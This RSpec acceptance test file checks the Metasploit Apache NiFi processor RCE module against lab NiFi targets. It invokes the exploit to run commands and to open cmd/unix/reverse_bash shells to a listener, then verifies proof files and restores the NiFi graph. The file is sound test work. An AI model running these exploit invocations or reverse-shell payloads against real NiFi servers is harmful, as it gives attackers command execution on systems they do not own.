require 'acceptance_spec_helper'
require 'json'
require 'timeout'

profile = ENV.fetch('NIFI_PROCESSOR_PROFILE', 'vulnerable')
raise ArgumentError, 'Unknown NiFi processor profile' unless %w[legacy vulnerable fixed].include?(profile)

RSpec.describe 'Genuine NiFi ExecuteProcess targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  before(:all) do
    @service = profile
    @native_sequence = 0
    @native = native_action('preflight')
    @accounts = File.readlines('test/module_targets/nifi/accounts.env', chomp: true).to_h { |line| line.split('=', 2) }
    # Console run creates execution replicants. Observe the standard event bus
    # without wrapping requests or changing callback lifetime/return values.
    ready = console_command(%q{irb -e 'observer = Object.new.extend(Msf::GeneralEventSubscriber); def observer.on_module_run(mod); @last_run = mod if mod.refname == "multi/http/apache_nifi_processor_rce"; end; framework.instance_variable_set(:@module_target_nifi_observer, observer); framework.events.add_general_subscriber(observer); puts "MODULE_TARGET_NIFI_OBSERVER=ready"'})
    expect(ready).to match(/^MODULE_TARGET_NIFI_OBSERVER=ready\r?$/)
    @observer_installed = true
  end

  before do |example|
    @case_id = example.metadata.fetch(:scoped_id).tr(':', '_')
    @attempted_module = false
    @before_state = native_action('snapshot')
    expect(@before_state.fetch('graph')).to eq(@native.fetch('initial_snapshot').fetch('graph'))
  end

  after do |example|
    next unless @before_state

    console_command('sessions -K')
    console_command('jobs -K')
    current = native_action('snapshot')
    if example.exception && @attempted_module && current.fetch('graph') != @before_state.fetch('graph')
      native_action('restore', @before_state, owned_identifiers)
    end
    target_exec(@service, 'rm', '-f', '/tmp/module-target-nifi-command-proof', '/tmp/module-target-nifi-session-proof')
  end

  after(:all) do
    native_action('verify-canary') if @native
  ensure
    console_command(%q{irb -e 'observer = framework.instance_variable_get(:@module_target_nifi_observer); framework.events.remove_general_subscriber(observer); framework.instance_variable_set(:@module_target_nifi_observer, nil)'}) if @observer_installed
  end

  it 'reports the actual login policy twice' do
    2.times do
      output = invoke({}, action: 'check')
      expected = profile == 'legacy' ? 'Apache NiFi instance does not support logins' : 'Apache NiFi instance supports logins'
      expect(output).to include(expected)
      expect_graph_restored
    end
  end

  it 'executes a generic Unix command twice and restores the genuine component graph' do
    2.times do
      path = '/tmp/module-target-nifi-command-proof'
      target_exec(@service, 'test', '!', '-e', path)
      invoke({ 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => "/usr/bin/touch #{path}", 'DisablePayloadHandler' => true, 'WfsDelay' => 0 })
      wait_for_expect(20, 0.1) { expect(native_file_present(path)).to eq('present') }
      expect(target_exec(@service, 'stat', '-c', '%U', path).strip).to eq('nifi')
      target_exec(@service, 'rm', path)
      expect_graph_restored
    end
  end

  it 'opens real command shells twice and preserves the stopped credential source' do
    2.times { prove_session('cmd/unix/reverse_bash') }
  end

  if profile == 'legacy'
    it 'executes twice with AutoCheck disabled on the genuine unauthenticated API' do
      2.times { prove_session('cmd/unix/reverse_bash', 'AutoCheck' => false) }
    end
  end

  if profile == 'vulnerable'
    it 'uses a genuine independently obtained bearer token twice' do
      2.times { prove_session('cmd/unix/reverse_bash', 'USERNAME' => '', 'PASSWORD' => '', 'BEARER-TOKEN' => @native.fetch('token')) }
    end

    it 'rejects the incompatible Linux Fetch payload twice without sessions or graph changes' do
      2.times do
        output = invoke({ 'PAYLOAD' => 'cmd/linux/http/x64/meterpreter/reverse_tcp', 'LHOST' => listener_host }, allow_errors: true)
        expect(output).to include('cmd/linux/http/x64/meterpreter/reverse_tcp is not a compatible payload')
        expect(console_command('sessions -l')).to include('No active sessions')
        expect_graph_restored
      end
    end

    it 'refuses missing credentials twice without changing the graph' do
      2.times do
        output = invoke({ 'USERNAME' => '', 'PASSWORD' => '', 'BEARER-TOKEN' => '', 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'id', 'DisablePayloadHandler' => true }, allow_errors: true)
        expect(output).to include('Authentication is required. Bearer-Token or Username and Password must be specified')
        expect_graph_restored
      end
    end

    it 'refuses an invalid bearer token twice without creating a processor' do
      2.times do
        output = invoke({ 'BEARER-TOKEN' => 'module-target-invalid-bearer', 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'id', 'DisablePayloadHandler' => true }, allow_errors: true)
        expect(output).to include('Unable to retrieve root process group')
        expect(output).to match(%r{HTTP/1\.1 401})
        expect(output).not_to include('Attempting to login')
        expect_graph_restored
      end
    end
  end

  if profile != 'legacy'
    it 'refuses a real wrong password twice without changing the graph' do
      2.times do
        output = invoke({ 'PASSWORD' => 'module-target-wrong-password', 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'id', 'DisablePayloadHandler' => true }, allow_errors: true)
        expect(output).to include('Invalid Credentials')
        expect_graph_restored
      end
    end
  end

  if profile != 'fixed'
    it 'does not identify the branded HTTP200 missing-base page as an accessible API twice' do
      2.times do
        output = invoke({ 'TARGETURI' => '/module-target-missing/' }, action: 'check', allow_errors: true)
        expect(output).to include('Unable to determine if logins are supported')
        expect(output).not_to include('Apache NiFi instance supports logins', 'Apache NiFi instance does not support logins')
        expect_graph_restored
      end
    end
  end

  if profile == 'legacy'
    it 'does not identify unrelated Apache HTTP as an accessible NiFi API twice' do
      2.times do
        output = invoke({ 'SSL' => false }, action: 'check', service: 'unrelated', allow_errors: true)
        expect(output).to include('Unable to determine if logins are supported')
        expect(output).not_to include('Apache NiFi instance supports logins', 'Apache NiFi instance does not support logins')
        expect_graph_restored
      end
    end
  end

  def native_action(action, *arguments)
    @native_sequence += 1
    tag = "#{@case_id || 'suite'}-#{@native_sequence}-#{action}"
    output, error, status = Open3.capture3('python3', '-B', 'test/module_targets/nifi_execution/actions.py', action, @service, tag, *arguments.map(&:to_json))
    File.write(File.join(target_runtime.fetch('artifacts'), "native-status-#{tag}.json"), JSON.pretty_generate(exitstatus: status.exitstatus, stdout: output, stderr: error))
    expect(status.success?).to be(true), error
    JSON.parse(output)
  end

  def invoke(options = {}, action: 'run -z', service: @service, allow_errors: false)
    defaults = { 'SSL' => @native.fetch('secure'), 'VHOST' => @service, 'TARGETURI' => '/', 'HttpTrace' => false }
    if @native.fetch('secure')
      defaults.merge!('USERNAME' => @accounts.fetch('SINGLE_USER_CREDENTIALS_USERNAME'), 'PASSWORD' => @accounts.fetch('SINGLE_USER_CREDENTIALS_PASSWORD'))
    end
    console_command(%q{irb -e 'framework.instance_variable_get(:@module_target_nifi_observer).instance_variable_set(:@last_run, nil)'})
    @attempted_module = true
    values = defaults.merge(options)
    # Hyphenated registered names use the console's public option-string route;
    # its bare positional assignment recognizer accepts only word/namespace names.
    bearer = values.delete('BEARER-TOKEN').to_s
    raise ArgumentError, 'Unexpected fixture bearer characters' unless bearer.match?(/\A[A-Za-z0-9_.-]*\z/)

    token_case = options.key?('BEARER-TOKEN') && !bearer.empty?
    values.merge!('HttpTrace' => true, 'HttpTraceHeadersOnly' => true) if token_case
    output = run_target_module('exploit/multi/http/apache_nifi_processor_rce', service, values, action: "#{action} -o BEARER-TOKEN=#{bearer}", allow_errors: allow_errors)
    if token_case
      receipt = console_command(%q{irb -e 'mod = framework.instance_variable_get(:@module_target_nifi_observer).instance_variable_get(:@last_run); puts "MODULE_TARGET_NIFI_BEARER=" + {refname: mod&.refname, token: mod&.datastore&.[]("BEARER-TOKEN")}.to_json'})
      data = receipt[/^MODULE_TARGET_NIFI_BEARER=(\{.*\})\r?$/, 1]
      expect(data).not_to be_nil, receipt
      actual = JSON.parse(data)
      expect(actual).to eq('refname' => 'multi/http/apache_nifi_processor_rce', 'token' => bearer)
      expect(output).to include("Authorization: Bearer #{bearer}")
    end
    expect(output).not_to include('Unknown datastore option:')
    expect(output).not_to match(/Manual cleanup is required|Unable to stop processor|Unable to create a new processor/) unless allow_errors
    output
  end

  def owned_identifiers
    output = console_command(%q{irb -e 'mod = framework.instance_variable_get(:@module_target_nifi_observer).instance_variable_get(:@last_run); puts "MODULE_TARGET_NIFI_OWNED=" + {refname: mod&.refname, processors: Array(mod&.instance_variable_get(:@processor)), services: Array(mod&.instance_variable_get(:@db_con_pool))}.to_json'})
    data = output[/^MODULE_TARGET_NIFI_OWNED=(\{.*\})\r?$/, 1]
    expect(data).not_to be_nil, output
    JSON.parse(data)
  end

  def expect_graph_restored
    Timeout.timeout(10) do
      wait_for_expect(100, 0.1) { expect(native_action('snapshot').fetch('graph')).to eq(@before_state.fetch('graph')) }
    end
  end

  def prove_session(payload, extra = {})
    path = '/tmp/module-target-nifi-session-proof'
    target_exec(@service, 'test', '!', '-e', path)
    options = { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 10, 'DisablePayloadHandler' => false }
    output = invoke(options.merge(extra))
    session_id = output[/Command shell session (\d+) opened/, 1]
    expect(session_id).not_to be_nil, output
    proof = console_command("sessions -i #{session_id} -c #{"/usr/bin/touch #{path}".inspect}")
    expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
    wait_for_expect(20, 0.1) { expect(native_file_present(path)).to eq('present') }
    expect(target_exec(@service, 'stat', '-c', '%U', path).strip).to eq('nifi')
    expect(console_command('sessions -K')).not_to match(/\[-\]|Exception|Unknown command/)
    target_exec(@service, 'rm', path)
    expect_graph_restored
  end

  def native_file_present(path)
    raise ArgumentError, 'Invalid fixture proof path' unless path.match?(%r{\A/tmp/module-target-nifi-[a-z-]+\z})

    target_exec(@service, 'sh', '-c', "if test -f #{path}; then printf present; fi")
  end
end
